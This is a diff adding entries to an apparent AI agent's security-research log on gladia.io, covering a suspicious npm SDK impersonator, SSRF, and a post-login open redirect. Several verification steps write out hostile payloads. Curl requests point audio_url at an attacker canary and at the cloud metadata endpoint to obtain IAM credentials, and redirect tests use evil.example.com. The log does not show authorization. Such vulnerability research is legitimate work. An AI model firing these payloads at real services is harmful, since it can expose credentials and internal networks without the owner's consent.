@@ -2685,3 +2685,32 @@ impact: Post-auth phishing redirect to attacker host; session/token exfiltration
 testability: HUMAN_ONLY
 [FINAL] re-ranked: (1) api.gladia.io SSRF 73 [AUTH_HELPED] | (2) npm gladia@0.1.3 95 [PASSIVE] | (3) app.gladia.io OATH redirect_to 55 [HUMAN_ONLY]
 [NEXT][PROBE]: PASSIVE — re-confirm fresh app.gladia.io /auth/google/callback finding: curl -sS -D - "https://app.gladia.io/auth/google/callback?code=fake123&state=abc" capture 500-body for stack/path leak + Set-Cookie oauth2:<uuid> Secure-flag absence (done at 19:34 → 500/14324B generic page, no Secure flag; re-verify no internal-detail regression).
+## 2026-08-09 20:51:31 UTC [app] (model laguna)
+[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK + raw API key in WebSocket URL query
+class: OTHER
+asset: npm registry `gladia@0.1.3` -> package/src/client.ts:306-308 + dist/gladia.cjs.development.js
+confidence: 95
+reasoning: dist-tag latest=0.1.3, description "Official TypeScript SDK for Gladia", repo git+https://github.com/alexisbouchez/gladia.ts.git. GitHub API returns 404 on both user alexisbouchez and repo (orphaned -> irrevocable takeover risk). Tarball shasum cc96f84a200c0fd49a71e919391f9b659c39f3e9 (sha256 3b23ec7d…7f2) static. RAG confirms src/client.ts:307 `.searchParams.append('x-gladia-key', this.apiKey)` before `new WebSocket(wsUrl)` — raw key in WSS URL query, diverges from official @gladiaio/sdk (POST /v2/live -> token response -> wss?token=<uuid>). README header "Unofficial" vs package.json "Official" contradiction.
+evidence_needed: npm registry metadata (description, repository, dist-tag); GitHub API 404 on user+repo; client.ts:307 snippet; README↔package.json contradiction.
+verify_steps: PASSIVE — `npm view gladia@0.1.3 description repository.url dist-tag maintainer homepage`; `npm pack gladia@0.1.3 && sha256sum gladia-0.1.3.tgz`; `curl -o /dev/null -w '%{http_code}' https://api.github.com/users/alexisbouchez`; `curl -o /dev/null -w '%{http_code}' https://api.github.com/repos/alexisbouchez/gladia.ts`; `grep -n "searchParams.append\|new WebSocket" package/src/client.ts`; `grep -i unofficial README.md`; `grep '"description"' package.json`
+impact: Supply-chain impersonation by orphaned maintainer (0% chance of legitimate ownership) + raw API key leaked into WebSocket URL query (proxy/edge logs, Referer, browser history, server logs). Severity: Medium.
+testability: PASSIVE
+[HYP] SSRF via client-supplied fetch URLs on api.gladia.io
+class: SSRF
+asset: api.gladia.io POST /v2/pre-recorded (audio_url), /video/text/video-transcription (video_url), /v2/live (wss), CallbackConfigDto.url, 7 webhook topics
+confidence: 73
+reasoning: /openapi.json (200, 125131B, CORS *, 14 paths/7 webhooks) exposes audio_url/video_url/callback_url as format:uri with no scheme allowlist; description says "external audio or video file" confirming server-side fetch by design; SDK RAG (packages/sdk-js/client.ts + packages/sdk-python/v2/prerecorded/core.py) confirms is_url()/uploadFile() only gates upload-vs-direct, no host allowlist; /v1/models (public, 530B) confirms FR+US egress. POST /v2/pre-recorded (no key)->401 NestJS {"message":"no gladia key provided","request_id":"G-*"}. WebSocket auth uses token in URL query per spec (wss://api.gladia.io/v2/live?token=<uuid>).
+evidence_needed: With x-gladia-key, POST {"audio_url":"http://<canary>"}->hit; then {"audio_url":"http://169.254.169.254/latest/meta-data/"}->IMDSv1; repeat callback_config.url + video_url.
+verify_steps: AUTH_HELPED — curl -X POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key:<KEY>" -H "Content-Type: application/json" -d '{"audio_url":"http://<attacker-canary>","encoding":"mp3"}'; then -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","encoding":"mp3"}'; repeat via /video/text/video-transcription {"video_url":"http://<canary>"} and {"video_url":"http://169.254.169.254/latest/meta-data/"}; compare error_code/status/timing + capture canary hit
+impact: Cloud-metadata read (AWS IMDSv1->IAM creds), internal-network enumeration from FR/US egress, potential data exfiltration. Severity: High (key-gated).
+testability: AUTH_HELPED
+[HYP] Post-auth open redirect via redirect_to on app.gladia.io /signin
+class: OATH
+asset: app.gladia.io /signin?redirect_to=https://evil.example.com
+confidence: 55
+reasoning: GET->200; form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" server-side reflection (verified fresh 2026-08-09 20:49 UTC) for protocol-relative //evil, bare-host, confusing-subdomain app.gladia.io.evil, path-only; no host allowlist at unauthenticated layer. CSP verified fresh: base-uri 'self', object-src 'none', frame-src allowlist, script-src nonce+strict-dynamic; 0 form-action directives (gap confirmed). OAuth redirect_uri FIXED=https://app.gladia.io/auth/google/callback (PKCE S256) prevents code/state theft; redirect_to NOT in OAuth state cookie. return-to cookie tamper-reset REJECTED. Post-auth honoring of redirect_to remains sole unverified gate.
+evidence_needed: After completing Google OAuth with ?redirect_to=https://evil.example.com, final HTTP 302 Location to external host; capture post-auth Set-Cookie.
+verify_steps: HUMAN_ONLY — (a) POST `intent=google` to /signin?redirect_to=https://evil.example.com (-> 302 to accounts.google.com, confirmed); (b) complete Google SSO in-browser; (c) capture post-auth 302 Location + Set-Cookie; (d) repeat //evil.example.com, app.gladia.io.evil.example.com, path-only /dashboard
+impact: Post-auth phishing redirect to attacker-controlled host; session hijacking via redirect chain. Severity: Medium.
+testability: HUMAN_ONLY
+[NEXT] RAG: Finalize npm `gladia@0.1.3` report with tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`, README↔package.json "Official/Unofficial" contradiction, GitHub user+repo 404 (orphaned), RAG-VERIFIED `package/src/client.ts:306–308` + `dist/gladia.cjs.development.js:826–838`: `new URL(`${baseUrl}/v2/live`)` -> `.searchParams.append('x-gladia-key', this.apiKey)` -> `new WebSocket(wsUrl.toString())`; compare against official `@gladiaio/sdk@1.1.0` `packages/sdk-js/client.ts` POST /v2/live -> token-from-response flow to document divergence.
